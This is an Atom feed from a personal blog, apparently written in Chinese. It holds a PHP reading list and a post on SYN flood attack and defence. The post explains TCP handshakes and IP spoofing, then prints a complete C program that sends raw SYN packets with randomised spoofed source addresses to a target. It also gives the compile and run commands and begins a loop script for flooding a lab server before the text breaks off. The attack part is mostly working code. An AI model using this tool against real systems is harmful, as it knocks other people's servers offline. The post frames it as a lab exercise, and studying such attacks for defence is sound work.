<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[SK's Blog]]></title>
  <link href="http://sunkid.me/atom.xml" rel="self"/>
  <link href="http://sunkid.me/"/>
  <updated>2013-11-18T15:09:24+08:00</updated>
  <id>http://sunkid.me/</id>
  <author>
    <name><![CDATA[sk.c]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[Php书籍整理]]></title>
    <link href="http://sunkid.me/blog/2013/11/05/php-book/"/>
    <updated>2013-11-05T12:18:00+08:00</updated>
    <id>http://sunkid.me/blog/2013/11/05/php-book</id>
    <content type="html"><![CDATA[<pre><code>感谢这些PHP书籍作者和博客们的无私奉献，PHP因为有你更出色 :)
</code></pre>

<h3>必读</h3>

<ul>
<li><a href="http://wulijun.github.io/php-the-right-way/">PHP之道</a></li>
<li><a href="http://www.laruence.com/2010/06/21/1608.html">PHP调试技术手册</a></li>
<li><a href="http://phpbestpractices.justjavac.com/">PHP 最佳实践</a></li>
<li><a href="https://code.google.com/p/pasc2at/wiki/SimplifiedChinese">高级PHP应用程序漏洞审核技术</a></li>
<li><a href="http://feiyang.me/2013/03/php-psr-in-chinese/">PHP的PSR规范中文版</a></li>
</ul>


<!-- more -->


<h3>深入</h3>

<ul>
<li><a href="https://github.com/walu/phpbook">PHP扩展开发及内核应用</a></li>
<li><a href="https://github.com/reeze/tipi">深入理解PHP内核</a></li>
</ul>


<h3>博客</h3>

<ul>
<li><a href="http://www.laruence.com/">风雪之隅</a></li>
<li><a href="http://blog.csdn.net/heiyeshuwu">黑夜路人</a></li>
<li><a href="http://yanbin.org/">抚琴居</a></li>
<li><a href="http://www.imsiren.com/">斯人博客</a></li>
</ul>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[syn flood(syn 洪水) 攻防实战]]></title>
    <link href="http://sunkid.me/blog/2013/10/18/syn-flooddos/"/>
    <updated>2013-10-18T13:54:00+08:00</updated>
    <id>http://sunkid.me/blog/2013/10/18/syn-flooddos</id>
    <content type="html"><![CDATA[<p>说到 <code>syn洪水</code> 大家应该都不陌生。 sk.c之前听说过其中的原理，但也没真枪实弹试过。
到最近在学习服务器调优才实践尝试了下，才有了这篇烂笔头博文，有说的不对的地方，还请赐教</p>

<p>一开始，我们还是再唠叨下 syn flood doc 的原理:</p>

<h3>1.TCP三次握手</h3>

<h4><code>syn flood doc</code> 是基于TCP协议缺陷的。那么，我们先看下TCP三次握手的协议图</h4>

<p><img src="http://sunkid.me/images/post/tcp.png"></p>

<p>我们看到，tcp 在初始化连接的时候，需要经过三次握手，若某客户端发送大量<code>syn</code>请求给服务端，然后不返回<code>ack</code>包。
那么，服务端将会存在大量的syn队列(SYN_RCVD),导致占用大量服务端资源，让其他正常用户无法正常访问服务器。</p>

<!-- more -->


<p><img src="http://sunkid.me/images/post/tcp2.png"></p>

<p>sk.c 之前想过这样的方案 <strong> 我们是否可以限制相同IP的syn请求数来解决问题？</strong></p>

<p>当然，这太天真了，原因在于: <strong> 单个数据包请求的IP来源地址可以轻松的伪造！</strong></p>

<p>嗯，这时我们需要简单了解下 IP 协议</p>

<h3>2.IP 协议</h3>

<h4>IP协议中，</h4>

<p><img src="http://sunkid.me/images/post/ip.png"></p>

<p>基于<strong>每个IP数据报头都标明(32位源IP地址)</strong>这点，我们只要在构造的 syn 包中随机的填写源IP地址, 那么就可以伪造数据来源的IP啦。</p>

<p>这样的话，那是不是意味着我们在互联网通信都可以用这样简单的方式来伪造IP呢？ &#8211; 答案是否定的，原因留给读者想想看 :)</p>

<h3>syn_act 实现</h3>

<h4>基于以上两个原理，我们可以写一个程序，用随机IP的 <code>syn</code> 去攻击一台服务器</h4>

<figure class='code'><figcaption><span>syn_act</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
<span class='line-number'>111</span>
<span class='line-number'>112</span>
<span class='line-number'>113</span>
<span class='line-number'>114</span>
<span class='line-number'>115</span>
<span class='line-number'>116</span>
<span class='line-number'>117</span>
<span class='line-number'>118</span>
<span class='line-number'>119</span>
<span class='line-number'>120</span>
<span class='line-number'>121</span>
<span class='line-number'>122</span>
<span class='line-number'>123</span>
<span class='line-number'>124</span>
<span class='line-number'>125</span>
<span class='line-number'>126</span>
<span class='line-number'>127</span>
<span class='line-number'>128</span>
<span class='line-number'>129</span>
<span class='line-number'>130</span>
<span class='line-number'>131</span>
<span class='line-number'>132</span>
<span class='line-number'>133</span>
<span class='line-number'>134</span>
<span class='line-number'>135</span>
<span class='line-number'>136</span>
<span class='line-number'>137</span>
<span class='line-number'>138</span>
<span class='line-number'>139</span>
<span class='line-number'>140</span>
<span class='line-number'>141</span>
<span class='line-number'>142</span>
<span class='line-number'>143</span>
<span class='line-number'>144</span>
<span class='line-number'>145</span>
<span class='line-number'>146</span>
<span class='line-number'>147</span>
<span class='line-number'>148</span>
<span class='line-number'>149</span>
<span class='line-number'>150</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cm">/*</span>
</span><span class='line'><span class="cm">Syn Flood DOS with LINUX sockets</span>
</span><span class='line'><span class="cm">*/</span>
</span><span class='line'><span class="cp">#include&lt;stdio.h&gt;</span>
</span><span class='line'><span class="cp">#include&lt;string.h&gt;        </span><span class="c1">//memset</span>
</span><span class='line'><span class="cp">#include&lt;sys/socket.h&gt;</span>
</span><span class='line'><span class="cp">#include&lt;stdlib.h&gt;        </span><span class="c1">//for exit(0);</span>
</span><span class='line'><span class="cp">#include&lt;errno.h&gt;         </span><span class="c1">//For errno - the error number</span>
</span><span class='line'><span class="cp">#include&lt;netinet/tcp.h&gt;   </span><span class="c1">//Provides declarations for tcp header</span>
</span><span class='line'><span class="cp">#include&lt;netinet/ip.h&gt;    </span><span class="c1">//Provides declarations for ip header</span>
</span><span class='line'><span class="cp">#include&lt;sys/time.h&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="k">struct</span> <span class="n">pseudo_header</span> <span class="p">{</span>    <span class="c1">//needed for checksum calculation</span>
</span><span class='line'>
</span><span class='line'>        <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">source_address</span><span class="p">;</span>
</span><span class='line'>        <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">dest_address</span><span class="p">;</span>
</span><span class='line'>        <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">placeholder</span><span class="p">;</span>
</span><span class='line'>        <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">protocol</span><span class="p">;</span>
</span><span class='line'>        <span class="kt">unsigned</span> <span class="kt">short</span> <span class="n">tcp_length</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>        <span class="k">struct</span> <span class="n">tcphdr</span> <span class="n">tcp</span><span class="p">;</span>
</span><span class='line'><span class="p">};</span>
</span><span class='line'>
</span><span class='line'><span class="kt">unsigned</span> <span class="kt">short</span> <span class="nf">csum</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">short</span> <span class="o">*</span><span class="n">ptr</span><span class="p">,</span><span class="kt">int</span> <span class="n">nbytes</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>        <span class="k">register</span> <span class="kt">long</span> <span class="n">sum</span><span class="p">;</span>
</span><span class='line'>        <span class="kt">unsigned</span> <span class="kt">short</span> <span class="n">oddbyte</span><span class="p">;</span>
</span><span class='line'>        <span class="k">register</span> <span class="kt">short</span> <span class="n">answer</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>        <span class="n">sum</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
</span><span class='line'>        <span class="k">while</span><span class="p">(</span><span class="n">nbytes</span><span class="o">&gt;</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>                <span class="n">sum</span><span class="o">+=*</span><span class="n">ptr</span><span class="o">++</span><span class="p">;</span>
</span><span class='line'>                <span class="n">nbytes</span><span class="o">-=</span><span class="mi">2</span><span class="p">;</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>        <span class="k">if</span><span class="p">(</span><span class="n">nbytes</span><span class="o">==</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>                <span class="n">oddbyte</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
</span><span class='line'>                <span class="o">*</span><span class="p">((</span><span class="n">u_char</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">oddbyte</span><span class="p">)</span><span class="o">=*</span><span class="p">(</span><span class="n">u_char</span><span class="o">*</span><span class="p">)</span><span class="n">ptr</span><span class="p">;</span>
</span><span class='line'>                <span class="n">sum</span><span class="o">+=</span><span class="n">oddbyte</span><span class="p">;</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>        <span class="n">sum</span> <span class="o">=</span> <span class="p">(</span><span class="n">sum</span><span class="o">&gt;&gt;</span><span class="mi">16</span><span class="p">)</span><span class="o">+</span><span class="p">(</span><span class="n">sum</span> <span class="o">&amp;</span> <span class="mh">0xffff</span><span class="p">);</span>
</span><span class='line'>        <span class="n">sum</span> <span class="o">=</span> <span class="n">sum</span> <span class="o">+</span> <span class="p">(</span><span class="n">sum</span><span class="o">&gt;&gt;</span><span class="mi">16</span><span class="p">);</span>
</span><span class='line'>        <span class="n">answer</span><span class="o">=</span><span class="p">(</span><span class="kt">short</span><span class="p">)</span><span class="o">~</span><span class="n">sum</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>        <span class="k">return</span><span class="p">(</span><span class="n">answer</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span> <span class="p">{</span>
</span><span class='line'>        <span class="c1">//Uncommend the loop if you want to flood :)</span>
</span><span class='line'>        <span class="c1">//Create a raw socket</span>
</span><span class='line'>        <span class="kt">int</span> <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span> <span class="p">(</span><span class="n">PF_INET</span><span class="p">,</span> <span class="n">SOCK_RAW</span><span class="p">,</span> <span class="n">IPPROTO_TCP</span><span class="p">);</span>
</span><span class='line'>        <span class="c1">//Datagram to represent the packet</span>
</span><span class='line'>        <span class="kt">char</span> <span class="n">datagram</span><span class="p">[</span><span class="mi">4096</span><span class="p">]</span> <span class="p">,</span> <span class="n">source_ip</span><span class="p">[</span><span class="mi">32</span><span class="p">],</span> <span class="n">dst_ip</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>
</span><span class='line'>        <span class="c1">//IP header</span>
</span><span class='line'>        <span class="k">struct</span> <span class="n">iphdr</span> <span class="o">*</span><span class="n">iph</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="n">iphdr</span> <span class="o">*</span><span class="p">)</span> <span class="n">datagram</span><span class="p">;</span>
</span><span class='line'>        <span class="c1">//TCP header</span>
</span><span class='line'>        <span class="k">struct</span> <span class="n">tcphdr</span> <span class="o">*</span><span class="n">tcph</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="n">tcphdr</span> <span class="o">*</span><span class="p">)</span> <span class="p">(</span><span class="n">datagram</span> <span class="o">+</span> <span class="k">sizeof</span> <span class="p">(</span><span class="k">struct</span> <span class="n">ip</span><span class="p">));</span>
</span><span class='line'>        <span class="k">struct</span> <span class="n">sockaddr_in</span> <span class="n">sin</span><span class="p">;</span>
</span><span class='line'>        <span class="k">struct</span> <span class="n">pseudo_header</span> <span class="n">psh</span><span class="p">;</span>
</span><span class='line'>        <span class="k">struct</span> <span class="n">timeval</span> <span class="n">tv_time</span><span class="p">;</span>
</span><span class='line'>        <span class="kt">int</span> <span class="n">ip1</span><span class="p">,</span><span class="n">ip2</span><span class="p">,</span><span class="n">ip3</span><span class="p">,</span><span class="n">ip4</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>        <span class="n">gettimeofday</span><span class="p">(</span><span class="o">&amp;</span><span class="n">tv_time</span><span class="p">,</span><span class="nb">NULL</span><span class="p">);</span>
</span><span class='line'>        <span class="n">srand</span><span class="p">(</span><span class="n">tv_time</span><span class="p">.</span><span class="n">tv_usec</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>        <span class="k">if</span><span class="p">(</span><span class="n">argc</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>                <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Usage: syn_act 172.16.5.69</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class='line'>                <span class="n">sprintf</span><span class="p">(</span><span class="n">dst_ip</span><span class="p">,</span><span class="s">&quot;%s&quot;</span><span class="p">,</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>        <span class="c1">// rand to get ip</span>
</span><span class='line'>        <span class="n">ip1</span> <span class="o">=</span> <span class="n">rand</span><span class="p">()</span> <span class="o">%</span> <span class="mi">196</span><span class="p">;</span>
</span><span class='line'>        <span class="n">ip2</span> <span class="o">=</span> <span class="n">rand</span><span class="p">()</span> <span class="o">%</span> <span class="mi">128</span><span class="p">;</span>
</span><span class='line'>        <span class="n">ip3</span> <span class="o">=</span> <span class="n">rand</span><span class="p">()</span> <span class="o">%</span> <span class="mi">256</span><span class="p">;</span>
</span><span class='line'>        <span class="n">ip4</span> <span class="o">=</span> <span class="n">rand</span><span class="p">()</span> <span class="o">%</span> <span class="mi">256</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>        <span class="n">sprintf</span><span class="p">(</span><span class="n">source_ip</span><span class="p">,</span><span class="s">&quot;%d.%d.%d.%d&quot;</span><span class="p">,</span><span class="n">ip1</span><span class="p">,</span><span class="n">ip2</span><span class="p">,</span><span class="n">ip3</span><span class="p">,</span><span class="n">ip4</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>        <span class="n">sin</span><span class="p">.</span><span class="n">sin_family</span> <span class="o">=</span> <span class="n">AF_INET</span><span class="p">;</span>
</span><span class='line'>        <span class="n">sin</span><span class="p">.</span><span class="n">sin_port</span> <span class="o">=</span> <span class="n">htons</span><span class="p">(</span><span class="mi">80</span><span class="p">);</span>
</span><span class='line'>        <span class="n">sin</span><span class="p">.</span><span class="n">sin_addr</span><span class="p">.</span><span class="n">s_addr</span> <span class="o">=</span> <span class="n">inet_addr</span><span class="p">(</span><span class="n">dst_ip</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>        <span class="n">memset</span><span class="p">(</span><span class="n">datagram</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">4096</span><span class="p">);</span>     <span class="cm">/* zero out the buffer */</span>
</span><span class='line'>
</span><span class='line'>        <span class="c1">//Fill in the IP Header</span>
</span><span class='line'>        <span class="n">iph</span><span class="o">-&gt;</span><span class="n">ihl</span> <span class="o">=</span> <span class="mi">5</span><span class="p">;</span>
</span><span class='line'>        <span class="n">iph</span><span class="o">-&gt;</span><span class="n">version</span> <span class="o">=</span> <span class="mi">4</span><span class="p">;</span>
</span><span class='line'>        <span class="n">iph</span><span class="o">-&gt;</span><span class="n">tos</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>        <span class="n">iph</span><span class="o">-&gt;</span><span class="n">tot_len</span> <span class="o">=</span> <span class="k">sizeof</span> <span class="p">(</span><span class="k">struct</span> <span class="n">ip</span><span class="p">)</span> <span class="o">+</span> <span class="k">sizeof</span> <span class="p">(</span><span class="k">struct</span> <span class="n">tcphdr</span><span class="p">);</span>
</span><span class='line'>        <span class="n">iph</span><span class="o">-&gt;</span><span class="n">id</span> <span class="o">=</span> <span class="n">htons</span><span class="p">(</span><span class="mi">54321</span><span class="p">);</span> <span class="c1">//Id of this packet</span>
</span><span class='line'>        <span class="n">iph</span><span class="o">-&gt;</span><span class="n">frag_off</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>        <span class="n">iph</span><span class="o">-&gt;</span><span class="n">ttl</span> <span class="o">=</span> <span class="mi">255</span><span class="p">;</span>
</span><span class='line'>        <span class="n">iph</span><span class="o">-&gt;</span><span class="n">protocol</span> <span class="o">=</span> <span class="n">IPPROTO_TCP</span><span class="p">;</span>
</span><span class='line'>        <span class="n">iph</span><span class="o">-&gt;</span><span class="n">check</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>         <span class="c1">//Set to 0 before calculating checksum</span>
</span><span class='line'>        <span class="n">iph</span><span class="o">-&gt;</span><span class="n">saddr</span> <span class="o">=</span> <span class="n">inet_addr</span> <span class="p">(</span> <span class="n">source_ip</span> <span class="p">);</span>   <span class="c1">//Spoof the source ip address</span>
</span><span class='line'>        <span class="n">iph</span><span class="o">-&gt;</span><span class="n">daddr</span> <span class="o">=</span> <span class="n">sin</span><span class="p">.</span><span class="n">sin_addr</span><span class="p">.</span><span class="n">s_addr</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>        <span class="n">iph</span><span class="o">-&gt;</span><span class="n">check</span> <span class="o">=</span> <span class="n">csum</span> <span class="p">((</span><span class="kt">unsigned</span> <span class="kt">short</span> <span class="o">*</span><span class="p">)</span> <span class="n">datagram</span><span class="p">,</span> <span class="n">iph</span><span class="o">-&gt;</span><span class="n">tot_len</span> <span class="o">&gt;&gt;</span> <span class="mi">1</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>        <span class="c1">//TCP Header</span>
</span><span class='line'>        <span class="n">tcph</span><span class="o">-&gt;</span><span class="n">source</span> <span class="o">=</span> <span class="n">htons</span> <span class="p">(</span><span class="mi">1234</span><span class="p">);</span>
</span><span class='line'>        <span class="n">tcph</span><span class="o">-&gt;</span><span class="n">dest</span> <span class="o">=</span> <span class="n">htons</span> <span class="p">(</span><span class="mi">80</span><span class="p">);</span>
</span><span class='line'>        <span class="n">tcph</span><span class="o">-&gt;</span><span class="n">seq</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>        <span class="n">tcph</span><span class="o">-&gt;</span><span class="n">ack_seq</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>        <span class="n">tcph</span><span class="o">-&gt;</span><span class="n">doff</span> <span class="o">=</span> <span class="mi">5</span><span class="p">;</span>         <span class="cm">/* first and only tcp segment */</span>
</span><span class='line'>        <span class="n">tcph</span><span class="o">-&gt;</span><span class="n">fin</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
</span><span class='line'>        <span class="n">tcph</span><span class="o">-&gt;</span><span class="n">syn</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span>
</span><span class='line'>        <span class="n">tcph</span><span class="o">-&gt;</span><span class="n">rst</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
</span><span class='line'>        <span class="n">tcph</span><span class="o">-&gt;</span><span class="n">psh</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
</span><span class='line'>        <span class="n">tcph</span><span class="o">-&gt;</span><span class="n">ack</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
</span><span class='line'>        <span class="n">tcph</span><span class="o">-&gt;</span><span class="n">urg</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
</span><span class='line'>        <span class="n">tcph</span><span class="o">-&gt;</span><span class="n">window</span> <span class="o">=</span> <span class="n">htons</span> <span class="p">(</span><span class="mi">5840</span><span class="p">);</span>    <span class="cm">/* maximum allowed window size */</span>
</span><span class='line'>        <span class="n">tcph</span><span class="o">-&gt;</span><span class="n">check</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span><span class="cm">/* if you set a checksum to zero, your kernel&#39;s IP stack</span>
</span><span class='line'><span class="cm">                                should fill in the correct checksum during transmission */</span>
</span><span class='line'>        <span class="n">tcph</span><span class="o">-&gt;</span><span class="n">urg_ptr</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>        <span class="c1">//Now the IP checksum</span>
</span><span class='line'>
</span><span class='line'>        <span class="n">psh</span><span class="p">.</span><span class="n">source_address</span> <span class="o">=</span> <span class="n">inet_addr</span><span class="p">(</span> <span class="n">source_ip</span> <span class="p">);</span>
</span><span class='line'>        <span class="n">psh</span><span class="p">.</span><span class="n">dest_address</span> <span class="o">=</span> <span class="n">sin</span><span class="p">.</span><span class="n">sin_addr</span><span class="p">.</span><span class="n">s_addr</span><span class="p">;</span>
</span><span class='line'>        <span class="n">psh</span><span class="p">.</span><span class="n">placeholder</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>        <span class="n">psh</span><span class="p">.</span><span class="n">protocol</span> <span class="o">=</span> <span class="n">IPPROTO_TCP</span><span class="p">;</span>
</span><span class='line'>        <span class="n">psh</span><span class="p">.</span><span class="n">tcp_length</span> <span class="o">=</span> <span class="n">htons</span><span class="p">(</span><span class="mi">20</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>        <span class="n">memcpy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">psh</span><span class="p">.</span><span class="n">tcp</span> <span class="p">,</span> <span class="n">tcph</span> <span class="p">,</span> <span class="k">sizeof</span> <span class="p">(</span><span class="k">struct</span> <span class="n">tcphdr</span><span class="p">));</span>
</span><span class='line'>
</span><span class='line'>        <span class="n">tcph</span><span class="o">-&gt;</span><span class="n">check</span> <span class="o">=</span> <span class="n">csum</span><span class="p">(</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">short</span><span class="o">*</span><span class="p">)</span> <span class="o">&amp;</span><span class="n">psh</span> <span class="p">,</span> <span class="k">sizeof</span> <span class="p">(</span><span class="k">struct</span> <span class="n">pseudo_header</span><span class="p">));</span>
</span><span class='line'>
</span><span class='line'>        <span class="c1">//IP_HDRINCL to tell the kernel that headers are included in the packet</span>
</span><span class='line'>        <span class="kt">int</span> <span class="n">one</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
</span><span class='line'>        <span class="k">const</span> <span class="kt">int</span> <span class="o">*</span><span class="n">val</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">one</span><span class="p">;</span>
</span><span class='line'>        <span class="k">if</span> <span class="p">(</span><span class="n">setsockopt</span> <span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">IPPROTO_IP</span><span class="p">,</span> <span class="n">IP_HDRINCL</span><span class="p">,</span> <span class="n">val</span><span class="p">,</span> <span class="k">sizeof</span> <span class="p">(</span><span class="n">one</span><span class="p">))</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>                <span class="n">printf</span> <span class="p">(</span><span class="s">&quot;Error setting IP_HDRINCL. Error number : %d . Error message : %s </span><span class="se">\n</span><span class="s">&quot;</span> <span class="p">,</span> <span class="n">errno</span> <span class="p">,</span> <span class="n">strerror</span><span class="p">(</span><span class="n">errno</span><span class="p">));</span>
</span><span class='line'>                <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>        <span class="c1">//Send the packet</span>
</span><span class='line'>        <span class="k">if</span> <span class="p">(</span><span class="n">sendto</span> <span class="p">(</span><span class="n">s</span><span class="p">,</span>          <span class="cm">/* our socket */</span>
</span><span class='line'>                    <span class="n">datagram</span><span class="p">,</span>       <span class="cm">/* the buffer containing headers and data */</span>
</span><span class='line'>                    <span class="n">iph</span><span class="o">-&gt;</span><span class="n">tot_len</span><span class="p">,</span>   <span class="cm">/* total length of our datagram */</span>
</span><span class='line'>                    <span class="mi">0</span><span class="p">,</span>              <span class="cm">/* routing flags, normally always 0 */</span>
</span><span class='line'>                    <span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr</span> <span class="o">*</span><span class="p">)</span> <span class="o">&amp;</span><span class="n">sin</span><span class="p">,</span>       <span class="cm">/* socket addr, just like in */</span>
</span><span class='line'>                    <span class="k">sizeof</span> <span class="p">(</span><span class="n">sin</span><span class="p">))</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>             <span class="cm">/* a normal send() */</span>
</span><span class='line'>                <span class="n">printf</span> <span class="p">(</span><span class="s">&quot;error</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class='line'>                <span class="c1">//Data send successfully</span>
</span><span class='line'>                <span class="n">printf</span> <span class="p">(</span><span class="s">&quot;Packet Send </span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>注：源码是引用了<a href="http://www.binarytides.com/syn-flood-dos-attack/">这里</a>的基础上添加了随机ip和目标ip参数</p>

<p>编译&amp;运行</p>

<pre><code>gcc main.c syn_act
sudo ./syn_act 172.16.5.69
Packet Send
</code></pre>

<p>注意：</p>

<ol>
<li>这个程序需要用root权限运行</li>
<li>如果你在内网环境攻击外网的机器会失败，因为连接外网路由器会验证你的ip数据包来源，并修改你的ip数据包来源地址，以便实现路由的<a href="http://zh.wikipedia.org/wiki/%E7%BD%91%E7%BB%9C%E5%9C%B0%E5%9D%80%E8%BD%AC%E6%8D%A2">NAT</a>功能</li>
</ol>


<h3>实战</h3>

<p>我们用上面的程序来攻击一台内网测试机,配置如下:</p>

<pre><code>测试服务器
    cpu   : i3
    memory: 2G
    system: ubuntu 12.04
    server: nginx
    ip    : 172.16.5.69

测试客户端
    cpu   : E5200
    memory: 2G
    system: ubuntu 12.04
    ip    : 172.16.5.147
</code></pre>

<h4>服务端准备</h4>

<p>挂上 <code>watch -n "netstat -n 1 | awk '/^tcp/ {++S[\$NF]} END {for(a in S) print a, S[a]}'"</code> 查看tcp状态</p>

<pre><code>TIME_WAIT 24
ESTABLISHED 5
</code></pre>

<h4>客户端准备</h4>

<p>上面提供的程序运行一次只发送一个<code>syn</code>包，在这我们写个shell脚本来循环跑程序</p>

<figure class='code'><figcaption><span>run.sh</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
